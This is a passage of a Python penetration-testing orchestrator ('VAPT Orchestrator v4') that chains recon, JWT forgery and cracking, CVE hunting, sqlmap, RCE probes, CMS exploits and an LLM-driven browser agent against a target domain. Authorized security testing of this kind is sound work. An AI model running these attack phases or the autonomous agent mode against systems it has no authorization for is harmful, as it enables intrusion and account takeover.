    jwt_wordlist = os.path.join(WORDLIST_DIR, "jwt-secrets.txt")
    if not os.path.isfile(jwt_wordlist):
        log("warn", "jwt-secrets.txt not found — run --setup-wordlists first")
        jwt_wordlist = ""

    for i, (token, source) in enumerate(list(found_jwts.items())[:10]):
        token_file = os.path.join(jwt_dir, f"jwt_{i+1}.txt")
        result_file = os.path.join(jwt_dir, f"jwt_{i+1}_results.txt")
        with open(token_file, "w") as f:
            f.write(token + "\n")

        log("info", f"JWT {i+1}: {token[:40]}... (from {os.path.basename(source)})")
        results = [f"# JWT {i+1} from {source}\n# Token: {token[:60]}...\n"]

        # Decode + flag check
        ok, out = run_cmd(
            f'python3 "{jwt_tool_py}" "{token}" -d 2>/dev/null',
            timeout=15
        )
        results.append(f"## Decode\n{out}\n")

        # alg=none attack
        ok2, out2 = run_cmd(
            f'python3 "{jwt_tool_py}" "{token}" -X a 2>/dev/null',
            timeout=15
        )
        results.append(f"## alg=none\n{out2}\n")
        if "TAMPERED" in out2 or "forged" in out2.lower():
            log("crit", f"JWT {i+1}: alg=none ACCEPTED — potential auth bypass!")

        # RS256→HS256 confusion
        ok3, out3 = run_cmd(
            f'python3 "{jwt_tool_py}" "{token}" -X k 2>/dev/null',
            timeout=15
        )
        results.append(f"## RS256→HS256 confusion\n{out3}\n")

        # Weak secret crack
        if jwt_wordlist:
            ok4, out4 = run_cmd(
                f'python3 "{jwt_tool_py}" "{token}" -C -d "{jwt_wordlist}" 2>/dev/null',
                timeout=120,
                watch_file=jwt_dir,
                watch_phase="JWT AUDIT"
            )
            results.append(f"## Secret crack\n{out4}\n")
            if "SECRET FOUND" in out4 or "secret found" in out4.lower():
                log("crit", f"JWT {i+1}: WEAK SECRET CRACKED!")

        with open(result_file, "w") as f:
            f.write("\n".join(results))

    log("ok", f"JWT audit complete → {jwt_dir}")
    _brain_phase_complete(
        "JWT AUDIT",
        True,
        detail=f"target={domain} tokens={len(found_jwts)}",
        artifacts={"jwt": jwt_dir},
    )
    return True


# ── Existing pipeline ──────────────────────────────────────────────────────────
def generate_reports(domain: str) -> int:
    findings_dir = _resolve_findings_dir(domain)
    if not os.path.isdir(findings_dir):
        log("warn", f"No findings for {domain}")
        return 0
    log("info", f"Generating reports: {domain}")
    script = os.path.join(SCRIPT_DIR, "reporter.py")
    report_dir = _resolve_reports_dir(domain, create=True)
    target_state_file = _target_state_path(domain)
    if _brain and _brain.enabled:
        _brain.phase_start("REPORTS", f"target={domain}")
    ok, output = run_cmd(
        f'TARGET_STATE_FILE="{target_state_file}" REPORTS_OUT_DIR="{report_dir}" python3 "{script}" "{findings_dir}"',
        watch_file=report_dir,
        watch_phase="REPORTS",
    )
    print(output)
    _brain_phase_complete(
        "REPORTS",
        ok,
        detail=f"target={domain}",
        artifacts={"reports": report_dir, "findings": findings_dir},
    )
    if os.path.isdir(report_dir):
        return len([f for f in os.listdir(report_dir)
                    if f.endswith(".md") and f != "SUMMARY.md"])
    return 0


def run_browser_scan(
    domain: str,
    findings_dir: str,
    headed: bool = False,
    model_override: str | None = None,
    session_id: str | None = None,
    allow_unsafe: bool = False,
) -> bool:
    """Run the optional real-browser validation phase safely."""
    phase_name = "BROWSER SCAN"
    if _brain and _brain.enabled:
        _brain.phase_start(
            phase_name,
            f"target={domain} headed={headed} session={session_id or 'legacy'}",
        )

    try:
        from browser_agent import BrowserAgent
    except ImportError:
        log("warn", "browser_agent.py not found — skipping browser phase")
        _brain_phase_complete(phase_name, False, detail=f"target={domain} import_error")
        return False

    log("phase", f"BROWSER SCAN: {domain}")
    try:
        agent = BrowserAgent(
            target=domain,
            findings_dir=findings_dir,
            headed=headed,
            model_override=model_override,
            session_id=session_id,
            allow_unsafe=allow_unsafe,
        )
        results = agent.run()
        total = sum(results.values()) if results else 0
        log("ok" if total else "info", f"Browser scan complete: {total} finding(s)")
        _brain_phase_complete(
            phase_name,
            bool(results),
            detail=f"target={domain} headed={headed} findings={total}",
            artifacts={"findings": findings_dir},
        )
        return bool(results)
    except Exception as exc:
        log("err", f"Browser scan failed: {exc}")
        _brain_phase_complete(phase_name, False, detail=f"target={domain} error={exc}")
        return False


def run_cve_hunt(domain: str) -> bool:
    log("info", f"CVE hunt: {domain}")
    script    = os.path.join(SCRIPT_DIR, "cve.py")
    recon_dir = _resolve_recon_dir(domain)
    recon_flag = f'--recon-dir "{recon_dir}"' if os.path.isdir(recon_dir) else ""
    findings_dir = _resolve_findings_dir(domain, create=True)
    cve_dir = os.path.join(findings_dir, "cves")
    os.makedirs(cve_dir, exist_ok=True)
    if _brain and _brain.enabled:
        _brain.phase_start("CVE HUNT", f"target={domain}")
    ok = run_live(
        f'FINDINGS_OUT_DIR="{findings_dir}" python3 "{script}" "{domain}" {recon_flag} --findings-dir "{findings_dir}"',
        timeout=CVE_HUNT_TIMEOUT,
        watch_file=cve_dir,
        watch_phase="CVE HUNT",
    )

    # ── cvemap: cross-reference live hosts against NVD/EPSS/Shodan CVE data ───
    # Installed: go install github.com/projectdiscovery/cvemap/cmd/cvemap@latest
    cvemap_bin = shutil.which("cvemap") or os.path.join(GOBIN, "cvemap")
    if os.path.exists(cvemap_bin):
        cvemap_out   = os.path.join(cve_dir, "cvemap_results.txt")
        httpx_file   = os.path.join(recon_dir, "live", "httpx_full.txt")

        # Extract unique CPE/product names from httpx tech-detect output
        if os.path.exists(httpx_file):
            log("info", "cvemap: correlating live tech stack with EPSS-ranked CVEs...")
            # Run cvemap for top EPSS CVEs matching common web techs found in scope
            run_live(
                f'"{cvemap_bin}" -severity critical,high -epss-score 0.5 '
                f'-limit 50 -o "{cvemap_out}" 2>/dev/null',
                timeout=120,
                watch_file=cve_dir,
                watch_phase="CVE HUNT"
            )
            if os.path.exists(cvemap_out):
                hits = sum(1 for _ in open(cvemap_out) if _.strip())
                if hits:
                    log("crit", f"cvemap: {hits} high-EPSS CVEs worth testing → {cvemap_out}")
    _brain_phase_complete(
        "CVE HUNT",
        ok,
        detail=f"target={domain}",
        artifacts={"cves": cve_dir},
    )
    return ok


def run_fuzzer(domain: str, deep: bool = False) -> bool:
    log("info", f"Zero-day fuzzer: {domain}")
    script     = os.path.join(SCRIPT_DIR, "fuzzer.py")
    recon_dir  = _resolve_recon_dir(domain)
    deep_flag  = "--deep" if deep else ""
    recon_flag = f'--recon-dir "{recon_dir}"' if os.path.isdir(recon_dir) else ""
    zero_day_dir = os.path.join(_resolve_findings_dir(domain, create=True), "zero_day")
    os.makedirs(zero_day_dir, exist_ok=True)
    if _brain and _brain.enabled:
        _brain.phase_start("ZERO DAY", f"target={domain} deep={deep}")
    ok = run_live(
        f'python3 "{script}" "https://{domain}" {recon_flag} --findings-dir "{zero_day_dir}" {deep_flag}',
        timeout=ZERO_DAY_TIMEOUT,
        watch_file=zero_day_dir,
        watch_phase="ZERO DAY",
    )
    _brain_phase_complete(
        "ZERO DAY",
        ok,
        detail=f"target={domain} deep={deep}",
        artifacts={"zero_day": zero_day_dir},
    )
    return ok


# ── Status ─────────────────────────────────────────────────────────────────────
def show_status() -> None:
    print(f"\n{BOLD}{'='*60}{NC}")
    print(f"{BOLD}  VAPT Pipeline v4 — Status{NC}")
    print(f"{BOLD}{'='*60}{NC}\n")

    installed, missing = check_tools()
    total = len(TOOL_REGISTRY)
    bar_len = 30
    filled  = int(bar_len * len(installed) / total)
    bar     = f"{GREEN}{'█' * filled}{NC}{'░' * (bar_len - filled)}"
    print(f"  Tools: {bar} {len(installed)}/{total}")
    if installed:
        print(f"  {GREEN}OK{NC}     : {', '.join(installed)}")
    if missing:
        print(f"  {RED}MISSING{NC}: {', '.join(missing)}")
        print(f"  {YELLOW}Hint{NC}   : python3 hunt.py --repair-tools")

    targets_file = os.path.join(TARGETS_DIR, "selected_targets.json")
    if os.path.exists(targets_file):
        with open(targets_file) as f:
            data = json.load(f)
        print(f"\n  Selected targets: {data.get('total_targets', 0)}")

    if os.path.isdir(RECON_DIR):
        domains = [d for d in os.listdir(RECON_DIR)
                   if os.path.isdir(os.path.join(RECON_DIR, d))]
        print(f"\n  Recon completed: {len(domains)} targets")
        for d in domains:
            recon_dir = _resolve_recon_dir(d)
            session_id = _active_recon_session_id(d)
            subs_file = os.path.join(recon_dir, "subdomains", "all.txt")
            live_file = os.path.join(recon_dir, "live", "urls.txt")
            crit_file = os.path.join(recon_dir, "priority", "critical_hosts.txt")
            high_file = os.path.join(recon_dir, "priority", "high_hosts.txt")
            js_file   = os.path.join(recon_dir, "js", "jsluice_secrets.txt")
            subs = sum(1 for _ in open(subs_file)) if os.path.exists(subs_file) else 0
            live = sum(1 for _ in open(live_file)) if os.path.exists(live_file) else 0
            crit = sum(1 for _ in open(crit_file)) if os.path.exists(crit_file) else 0
            high = sum(1 for _ in open(high_file)) if os.path.exists(high_file) else 0
            js   = sum(1 for _ in open(js_file))   if os.path.exists(js_file)   else 0
            crit_col = f"{MAGENTA}{BOLD}CRIT={crit}{NC}" if crit else "CRIT=0"
            high_col = f"{YELLOW}HIGH={high}{NC}" if high else "HIGH=0"
            js_col   = f"{CYAN}JS={js}{NC}" if js else "JS=0"
            session_suffix = f" [{session_id}]" if session_id else ""
            print(f"    {BOLD}{d}{NC}{session_suffix}: {subs} subs | {live} live | {crit_col} {high_col} {js_col}")

    if os.path.isdir(FINDINGS_DIR):
        for d in os.listdir(FINDINGS_DIR):
            findings_dir = _resolve_findings_dir(d)
            summary = os.path.join(findings_dir, "summary.txt")
            if os.path.exists(summary):
                content = open(summary).read()
                parts   = content.split("TOTAL FINDINGS:")
                if len(parts) > 1:
                    total = parts[1].strip().split("\n")[0].strip()
                    print(f"    {d}: {total} findings")

    if os.path.isdir(REPORTS_DIR):
        print(f"\n  Reports:")
        for d in os.listdir(REPORTS_DIR):
                rdir = _resolve_reports_dir(d)
                if os.path.isdir(rdir):
                    rpts = [f for f in os.listdir(rdir)
                        if f.endswith(".md") and f != "SUMMARY.md"]
                    print(f"    {d}: {len(rpts)} reports")

    print(f"\n{'='*60}\n")


# ── Hunt single target ─────────────────────────────────────────────────────────
def hunt_target(
    domain: str,
    quick: bool = False,
    resume: bool = False,
    resume_session_id: str | None = None,
    recon_only: bool = False,
    scan_only: bool = False,
    cve_hunt: bool = False,
    zero_day: bool = False,
    prioritize_only: bool = False,
    batch_size: int = 10,
    # New phase flags
    js_scan: bool = False,
    param_discover: bool = False,
    api_fuzz: bool = False,
    secret_hunt: bool = False,
    cors_check: bool = False,
    cms_exploit: bool = False,
    rce_scan: bool = False,
    sqlmap_scan: bool = False,
    jwt_audit: bool = False,
    post_param_discover: bool = False,
    cookie: str = "",
    skip_items: set[str] | None = None,
    full: bool = False,
    skip_scan: bool = False,
    scope_lock: bool = False,
    max_urls: int = 100,
    browser_scan: bool = False,
    browser_headed: bool = False,
    browser_model: str | None = None,
    browser_unsafe: bool = False,
) -> dict:
    skip_items = skip_items or set()
    result = {
        "domain":            domain,
        "success":           True,
        "recon":             False,
        "scan":              False,
        "reports":           0,
        "js_analysis":       False,
        "param_discovery":   False,
        "post_params":       False,
        "api_fuzz":          False,
        "secret_hunt":       False,
        "cors":              False,
        "cms_exploit":       False,
        "rce_scan":          False,
        "sqlmap":            False,
        "jwt_audit":         False,
        "browser_scan":      False,
        "session_id":        None,
        "recon_dir":         "",
        "findings_dir":      "",
        "report_dir":        "",
    }

    explicit_phase_selection = any((
        js_scan, param_discover, api_fuzz, secret_hunt, cors_check,
        cms_exploit, rce_scan, sqlmap_scan, jwt_audit, cve_hunt, zero_day,
        post_param_discover, browser_scan,
    ))
    selected_only_mode = explicit_phase_selection and not full and not (recon_only or scan_only or prioritize_only)

    # --full enables all phases; default mode stays focused on higher-yield RCE/SQLi work.
    if full:
        js_scan = param_discover = api_fuzz = secret_hunt = cors_check = True
        cve_hunt = cms_exploit = rce_scan = sqlmap_scan = jwt_audit = True
        post_param_discover = browser_scan = True
    elif not any((
        js_scan, param_discover, api_fuzz, secret_hunt, cors_check,
        cms_exploit, rce_scan, sqlmap_scan, jwt_audit, cve_hunt, zero_day,
        post_param_discover, browser_scan,
    )) and not (recon_only or scan_only or prioritize_only):
        cms_exploit = True
        rce_scan = True
        sqlmap_scan = True
        log("info", "Default focused profile: prioritising CMS/RCE/SQLi checks. Use --full for the complete checklist.")
    elif selected_only_mode:
        log("info", "Targeted phase mode: running only the requested phases and skipping automatic scan/report extras.")

    if sqlmap_scan and not post_param_discover and not skip_has(skip_items, "post_params"):
        post_param_discover = True
        log("info", "Auto-enabling POST parameter discovery before SQLmap (lightpanda + arjun).")

    if resume or resume_session_id:
        requested_session_id = resume_session_id or "latest"
        active_session_id, active_recon_dir = _activate_recon_session(
            domain,
            requested_session_id=requested_session_id,
            create=False,
        )
        if not active_recon_dir:
            log("err", f"No recon session found for {domain} to resume")
            result["success"] = False
            return result
        result["session_id"] = active_session_id
        result["recon_dir"] = active_recon_dir
        result["findings_dir"] = _resolve_findings_dir(domain, session_id=active_session_id, create=True)
        result["report_dir"] = _resolve_reports_dir(domain, session_id=active_session_id, create=True)
        log("info", f"Using recon session: {active_session_id or 'legacy'} → {active_recon_dir}")

    if prioritize_only:
        if skip_has(skip_items, "prioritize"):
            log("info", f"Skipping prioritization for {domain} (--skip prioritize)")
        else:
            result["recon"] = run_prioritize(domain)
        return result

    # ── Phase 1: Recon ──────────────────────────────────────────────────────
    should_run_recon = (
        not scan_only
        and not skip_has(skip_items, "recon")
        and (not selected_only_mode or not (resume or resume_session_id))
    )
    if should_run_recon:
        result["recon"] = run_recon(
            domain,
            quick=quick,
            batch_size=batch_size,
            resume=resume,
            session_id=resume_session_id,
            scope_lock=scope_lock,
            max_urls=max_urls,
        )
        if not result["recon"]:
            log("warn", f"Recon had issues for {domain}, continuing...")

        # Brain: post-recon hook — analyze data AND generate targeted scan plan
        recon_dir = _resolve_recon_dir(domain, session_id=resume_session_id)
        result["session_id"] = _active_recon_session_id(domain)
        result["recon_dir"] = recon_dir
        result["findings_dir"] = _resolve_findings_dir(domain, session_id=result["session_id"], create=True)
        result["report_dir"] = _resolve_reports_dir(domain, session_id=result["session_id"], create=True)
        findings_dir_early = result["findings_dir"]
        if _brain and _brain.enabled and os.path.isdir(recon_dir) and not selected_only_mode:
            log("info", "Brain: post-recon hook (analyze + scan plan)...")
            _brain.post_recon_hook(recon_dir, findings_dir_early)
    elif not scan_only:
        if selected_only_mode and (resume or resume_session_id):
            log("info", f"Targeted phase mode: reusing existing recon for {domain}")
        else:
            log("info", f"Skipping recon for {domain} (--skip recon)")

    if recon_only:
        return result

    # ── Phase 2: JS Analysis (new) ─────────────────────────────────────────
    if js_scan and not skip_has(skip_items, "js_analysis"):
        result["js_analysis"] = run_js_analysis(domain)

    # ── Phase 3: Secret Hunt (new) ─────────────────────────────────────────
    if secret_hunt and not skip_has(skip_items, "secret_hunt"):
        result["secret_hunt"] = run_secret_hunt(domain)

    # ── Phase 4: Parameter Discovery (new) ────────────────────────────────
    if param_discover and not skip_has(skip_items, "param_discovery"):
        result["param_discovery"] = run_param_discovery(domain)

    # ── Phase 5: API Fuzzing (new) ─────────────────────────────────────────
    if api_fuzz and not quick and not skip_has(skip_items, "api_fuzz"):
        result["api_fuzz"] = run_api_fuzz(domain)

    # ── Phase 6: CORS Check (new) ──────────────────────────────────────────
    if cors_check and not skip_has(skip_items, "cors"):
        result["cors"] = run_cors_check(domain)

    # ── Phase 7: Vuln Scan ─────────────────────────────────────────────────
    should_run_vuln_scan = scan_only or full or (not selected_only_mode and not recon_only)
    if not should_run_vuln_scan:
        log("info", f"Skipping vuln scan for {domain} (not requested in targeted phase mode)")
    elif skip_scan or skip_has(skip_items, "scan", "vuln_scan"):
        log("info", f"Skipping vuln scan for {domain} (already covered by autonomous session)")
    else:
        result["scan"] = run_vuln_scan(domain, quick=quick, skip_items=skip_items, full=full)

    # ── Phase 8: CMS Exploit (Drupal / WordPress) ──────────────────────────
    if cms_exploit and not skip_has(skip_items, "cms_exploit"):
        result["cms_exploit"] = run_cms_exploit(domain)

    # ── Phase 8.5: RCE Scan (Log4Shell + Tomcat PUT + JBoss) ───────────────
    if rce_scan and not skip_has(skip_items, "rce_scan"):
        result["rce_scan"] = run_rce_scan(domain)

    # ── Phase 9: POST parameter discovery + sqlmap POST ─────────────────────
    if post_param_discover and not skip_has(skip_items, "post_params"):
        result["post_params"] = run_post_param_discovery(domain, cookies=cookie)

    # ── Phase 9b: sqlmap targeted (GET params) ───────────────────────────────
    if sqlmap_scan and not skip_has(skip_items, "sqlmap"):
        result["sqlmap"] = run_sqlmap_targeted(domain, cookies=cookie)

    # ── Phase 10: JWT Audit ────────────────────────────────────────────────
    if jwt_audit and not skip_has(skip_items, "jwt_audit"):
        result["jwt_audit"] = run_jwt_audit(domain)

    # ── Phase 11: Browser Scan (real-browser validation) ───────────────────
    findings_dir_early = (
        result.get("findings_dir")
        or _resolve_findings_dir(domain, session_id=result.get("session_id"), create=True)
    )
    if browser_scan and not skip_has(skip_items, "browser_scan", "browser"):
        result["browser_scan"] = run_browser_scan(
            domain,
            findings_dir=findings_dir_early,
            headed=browser_headed,
            model_override=browser_model,
            session_id=result.get("session_id"),
            allow_unsafe=browser_unsafe,
        )

    # Brain: post-scan hook — interpret + chains + triage + exploit + report
    findings_dir = result.get("findings_dir") or _resolve_findings_dir(domain, session_id=result.get("session_id"), create=True)
    recon_dir = result.get("recon_dir") or _resolve_recon_dir(domain, session_id=resume_session_id)
    result["session_id"] = result.get("session_id") or _active_recon_session_id(domain)
    result["recon_dir"] = recon_dir
    result["findings_dir"] = findings_dir
    result["report_dir"] = result.get("report_dir") or _resolve_reports_dir(domain, session_id=result["session_id"], create=True)
    if _brain and _brain.enabled and os.path.isdir(findings_dir) and not selected_only_mode:
        log("info", "Brain: post-scan hook (triage + exploit + report)...")
        _brain.post_scan_hook(findings_dir, recon_dir)

    # ── Phase 11: CVE Hunt ─────────────────────────────────────────────────
    if cve_hunt and not skip_has(skip_items, "cve_hunt"):
        run_cve_hunt(domain)

    # ── Phase 12: Zero-day Fuzzer ───────────────────────────────────────────
    if zero_day and not skip_has(skip_items, "zero_day"):
        log("warn", "Zero-day fuzzer — results require manual verification")
        run_fuzzer(domain, deep=not quick)

    # ── Phase 13: Reports ───────────────────────────────────────────────────
    if selected_only_mode:
        log("info", f"Skipping automatic report generation for {domain} (targeted phase mode)")
    elif not skip_has(skip_items, "reports"):
        result["reports"] = generate_reports(domain)

    # (Report writing is handled inside post_scan_hook above)

    return result


# ── Dashboard ──────────────────────────────────────────────────────────────────
def print_dashboard(results: list) -> None:
    print(f"\n{BOLD}{'='*65}{NC}")
    print(f"{BOLD}  HUNT COMPLETE — v4 Summary{NC}")
    print(f"{BOLD}{'='*65}{NC}\n")
    print(f"  Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

    total_reports = 0
    for r in results:
        status = f"{GREEN}OK{NC}" if r["success"] else f"{RED}FAIL{NC}"
        print(f"  [{status}] {BOLD}{r['domain']}{NC}")
        phases = []
        if r.get("recon"):           phases.append(f"{GREEN}Recon✓{NC}")
        if r.get("js_analysis"):     phases.append(f"{CYAN}JS✓{NC}")
        if r.get("secret_hunt"):     phases.append(f"{MAGENTA}Secrets✓{NC}")
        if r.get("param_discovery"): phases.append(f"{BLUE}Params✓{NC}")
        if r.get("api_fuzz"):        phases.append(f"{YELLOW}API✓{NC}")
        if r.get("cors"):            phases.append(f"{CYAN}CORS✓{NC}")
        if r.get("scan"):            phases.append(f"{GREEN}Scan✓{NC}")
        if r.get("cms_exploit"):     phases.append(f"{RED}CMS✓{NC}")
        if r.get("rce_scan"):        phases.append(f"{RED}RCE✓{NC}")
        if r.get("sqlmap"):          phases.append(f"{RED}SQLi✓{NC}")
        if r.get("jwt_audit"):       phases.append(f"{YELLOW}JWT✓{NC}")
        if r.get("browser_scan"):    phases.append(f"{CYAN}Browser✓{NC}")
        if phases:
            print(f"       Phases : {' | '.join(phases)}")
        print(f"       Reports: {r.get('reports', 0)}")
        if r.get("session_id"):
            print(f"       Session ID: {r['session_id'] or 'legacy'}")
        if r.get("autonomous_plan"):
            print(f"       Auto   : {', '.join(r['autonomous_plan'])}")
        if r.get("autonomous_session"):
            print(f"       Session: {r['autonomous_session']}")

        recon_dir = r.get("recon_dir") or ""
        crit_file = os.path.join(recon_dir, "priority", "critical_hosts.txt") if recon_dir else ""
        high_file = os.path.join(recon_dir, "priority", "high_hosts.txt") if recon_dir else ""
        if crit_file and os.path.exists(crit_file):
            crit = sum(1 for _ in open(crit_file))
            high = sum(1 for _ in open(high_file)) if os.path.exists(high_file) else 0
            if crit:
                print(f"       {MAGENTA}{BOLD}CRITICAL CVE hosts: {crit}{NC}")
            if high:
                print(f"       {YELLOW}HIGH CVE hosts: {high}{NC}")

        total_reports += r.get("reports", 0)

    print(f"\n  Total reports: {total_reports}")
    print(f"  Reports dir  : {REPORTS_DIR}/")

    # ── NEW: Blackhat Presentation Ready Summary ─────────────────────────────
    verified_sqli = []
    verified_rce  = []
    for r in results:
        fdir = r.get("findings_dir")
        if not fdir: continue
        
        # Check for verified SQLi
        sqli_f = os.path.join(fdir, "sqli", "timebased_candidates.txt")
        if os.path.isfile(sqli_f):
            for line in open(sqli_f):
                if "SQLI-POC-VERIFIED" in line:
                    verified_sqli.append(line.strip())
        
        # Check for verified RCE
        rce_f = os.path.join(fdir, "upload", "verified_rce_pocs.txt")
        if os.path.isfile(rce_f):
            for line in open(rce_f):
                if "[RCE-POC]" in line:
                    verified_rce.append(line.strip())

    if verified_sqli or verified_rce:
        print(f"\n{MAGENTA}{BOLD}{'='*65}{NC}")
        print(f"{MAGENTA}{BOLD}  CRITICAL VERIFIED FINDINGS — Presentation Ready{NC}")
        print(f"{MAGENTA}{BOLD}{'='*65}{NC}")
        
        if verified_rce:
            print(f"\n  {RED}{BOLD}[Verified RCE (Code Execution)]{NC}")
            for poc in verified_rce:
                u = poc.split("] ")[1] if "] " in poc else poc
                print(f"  → {BOLD}{u}{NC}")
                
        if verified_sqli:
            print(f"\n  {RED}{BOLD}[Verified SQL Injection (Linear Scaling)]{NC}")
            for poc in verified_sqli:
                u = poc.split("url=")[1] if "url=" in poc else poc
                print(f"  → {BOLD}{u}{NC}")
        print(f"\n{MAGENTA}{'='*65}{NC}\n")

    if total_reports > 0:
        print(f"\n  {YELLOW}Next steps:{NC}")
        print("  1. Review reports in reports/ — validate before submitting")
        print("  2. Check JS secrets → hunt for exposed API keys, OAuth secrets")
        print("  3. Use OOB token (--oob-setup) for blind SQLi / SSRF / XXE")
        print("  4. Manually verify IDOR candidates (need 2 accounts)")
        print("  5. Run 7-Question Gate on each finding: --triage \"finding...\"")
        print("  6. Generate report: python3 reporter.py <findings_dir>")

    if _brain and _brain.enabled:
        print(f"\n  {MAGENTA}{BOLD}Brain analysis:{NC}")
        for r in results:
            recon_dir = r.get("recon_dir") or ""
            rd = os.path.join(recon_dir, "brain") if recon_dir else ""
            findings_dir = r.get("findings_dir") or _resolve_findings_dir(r["domain"], session_id=r.get("session_id"))
            fd = os.path.join(findings_dir, "brain")
            for d in (rd, fd):
                if os.path.isdir(d):
                    for f in sorted(os.listdir(d)):
                        if f.endswith(".md"):
                            print(f"    {d}/{f}")

    print(f"\n{'='*65}\n")


# ── CLI ────────────────────────────────────────────────────────────────────────
def main() -> None:
    parser = argparse.ArgumentParser(
        description="VAPT Orchestrator v4",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 hunt.py --target example.com              Focused high-yield pipeline (SQLi/RCE/CMS/CVEs)
  python3 hunt.py --target example.com --full       All phases (JS, secrets, API, CORS, etc.)
  python3 hunt.py --target example.com --autonomous Bounded autonomous hunt
  python3 hunt.py --target example.com --resume     Resume the latest recon session
  python3 hunt.py --target example.com --resume 20260322_101530_abcd
  python3 hunt.py --target example.com --quick      Quick focused scan
  python3 hunt.py --target example.com --js-scan    JS analysis + secret extraction
  python3 hunt.py --target example.com --secret-hunt  TruffleHog + GitHound
  python3 hunt.py --target example.com --param-discover  Arjun + ParamSpider
  python3 hunt.py --target example.com --api-fuzz   Kiterunner + Feroxbuster
  python3 hunt.py --target example.com --cors-check  CORS misconfig check
  python3 hunt.py --target example.com --exploit     Drupal/WP nuclei templates + PoC + Metasploit .rc
  python3 hunt.py --target example.com --rce-scan   Log4Shell OOB + CVE-2017-12615 Tomcat PUT + JBoss admin
  python3 hunt.py --target example.com --sqlmap      sqlmap on all SQLi candidates
  python3 hunt.py --target example.com --jwt-audit   jwt_tool: alg=none, crack, RS256→HS256
  python3 hunt.py --target example.com --browser-scan Real-browser validation phase
  python3 hunt.py --target example.com --skip xss,sqli,cors
  python3 hunt.py --semgrep /path/to/source --target example.com
  python3 hunt.py --oob-setup                       Show OOB interactsh setup
  python3 hunt.py --triage "IDOR in /api/user/123"  7-question gate
  python3 hunt.py --brain-next --target example.com  Brain: next action?
  python3 hunt.py --status                           Pipeline status
  python3 hunt.py --repair-tools                     Auto-install missing tools, then continue or exit
  python3 hunt.py --setup-wordlists                  Download/refresh all wordlists
        """
    )
    # Core
    parser.add_argument("--target",           type=str,  help="Target: FQDN, IP, or CIDR (e.g. example.com, 192.168.1.1, 10.0.0.0/24)")
    parser.add_argument("--quick",            action="store_true", help="Quick focused scan mode")
    parser.add_argument("--resume",           nargs="?", const="latest", metavar="SESSION_ID",
                        help="Resume an existing recon session. Omit SESSION_ID to reuse the latest session, or pass a specific session ID to continue that exact recon folder")
    parser.add_argument("--autonomous",       action="store_true",
                        help="Bounded autonomous mode: infer the next best phases from recon evidence and checkpoint progress")
    parser.add_argument("--allow-destructive", action="store_true",
                        help="Allow autonomous mode to run noisier phases like CMS exploit checks, RCE probes, sqlmap, and zero-day fuzzing")
    parser.add_argument("--max-steps",        type=int, default=DEFAULT_AUTONOMOUS_STEPS,
                        help=f"Maximum autonomous phases to schedule after recon (default: {DEFAULT_AUTONOMOUS_STEPS})")
    parser.add_argument("--recon-only",       action="store_true")
    parser.add_argument("--scan-only",        action="store_true")
    parser.add_argument("--report-only",      action="store_true")
    parser.add_argument("--prioritize-only",  action="store_true")
    parser.add_argument("--status",           action="store_true")
    parser.add_argument("--repair-tools",     action="store_true",
                        help="Attempt to auto-install missing tools before running")
    parser.add_argument("--allow-system-installs", action="store_true",
                        help="Allow auto-repair to run brew/pip installs in addition to user-space Go/curl/git installs")
    parser.add_argument("--no-auto-install-tools", action="store_true",
                        help="Disable proactive safe tool installation in autonomous mode")
    parser.add_argument("--setup-wordlists",  action="store_true")
    parser.add_argument("--cve-hunt",         action="store_true")
    parser.add_argument("--zero-day",         action="store_true")
    parser.add_argument("--select-targets",   action="store_true")
    parser.add_argument("--top",              type=int, default=10)
    parser.add_argument("--batch-size",       type=int, default=10,
                        help="Subdomains per batch (default: 10)")
    # New phases
    parser.add_argument("--full",             action="store_true",
                        help="Run the full low+high-yield checklist. Default mode focuses on SQLi/RCE/CMS/CVE work")
    parser.add_argument("--js-scan",          action="store_true",
                        help="JS analysis: jsluice + SecretFinder + TruffleHog")
    parser.add_argument("--secret-hunt",      action="store_true",
                        help="Secret scan: TruffleHog on recon + GitHound on GitHub")
    parser.add_argument("--param-discover",   action="store_true",
                        help="Parameter discovery: Arjun + ParamSpider")
    parser.add_argument("--api-fuzz",         action="store_true",
                        help="API brute: Kiterunner + Feroxbuster")
    parser.add_argument("--cors-check",       action="store_true",
                        help="CORS misconfig check on all live hosts")
    parser.add_argument("--exploit",          action="store_true",
                        help="CMS exploit: nuclei Drupal/WP templates + Drupalgeddon2 PoC + Metasploit .rc")
    parser.add_argument("--cms-exploit",      action="store_true",
                        help="Alias for --exploit")
    parser.add_argument("--rce-scan",         action="store_true",
                        help="RCE scan: Log4Shell (CVE-2021-44228) OOB + Tomcat PUT (CVE-2017-12615) + JBoss admin exposure")
    parser.add_argument("--sqlmap",           action="store_true",
                        help="sqlmap on SQLi candidates (level=3, risk=2)")
    parser.add_argument("--jwt-audit",        action="store_true",
                        help="jwt_tool: alg=none, secret crack, RS256→HS256 confusion")
    parser.add_argument("--browser-scan",     action="store_true",
                        help="Real-browser vuln validation: DOM XSS, CSRF, auth bypass, open redirect")
    parser.add_argument("--browser-headed",   action="store_true",
                        help="Show browser window during --browser-scan (default: headless)")
    parser.add_argument("--browser-model",    type=str, default=None, metavar="MODEL",
                        help="Override LLM model for browser agent (default: auto-detect)")
    parser.add_argument("--browser-unsafe",   action="store_true",
                        help="Allow browser tasks that may submit forms or try default credentials")
    parser.add_argument("--scope-lock",       action="store_true",
                        help="Scope-lock: skip subdomain enumeration entirely — test only the exact --target given (no assetfinder/subfinder/amass/crt.sh)")
    parser.add_argument("--max-urls",         type=int, default=100, metavar="N",
                        help="Cap total URLs collected during recon to N (default: 100, priority-ordered: params > JS > API > rest). Use 0 for unlimited.")
    parser.add_argument("--skip",             action="append", default=[],
                        help="Skip phases/checks. Repeat or comma-separate values, e.g. --skip xss,sqli or --skip api --skip rce")
    parser.add_argument("--semgrep",          type=str, metavar="SOURCE_DIR",
                        help="Run Semgrep static analysis on source directory")
    parser.add_argument("--oob-setup",        action="store_true",
                        help="Show interactsh OOB setup for blind tests")
    # Brain
    parser.add_argument("--no-brain",         action="store_true")
    parser.add_argument("--brain-only",       action="store_true")
    parser.add_argument("--triage",           type=str, metavar="FINDING")
    parser.add_argument("--brain-next",       action="store_true")
    parser.add_argument("--time",             type=float, default=2.0)
    parser.add_argument("--agent",            action="store_true",
                        help="Use ReAct LLM agent for true autonomous hunting (Ollama tool calling)")
    parser.add_argument("--langgraph",        action="store_true",
                        help="Use real LangGraph backend for agent mode (requires pip install langgraph langchain-ollama)")
    parser.add_argument("--request-file",     type=str, metavar="PATH",
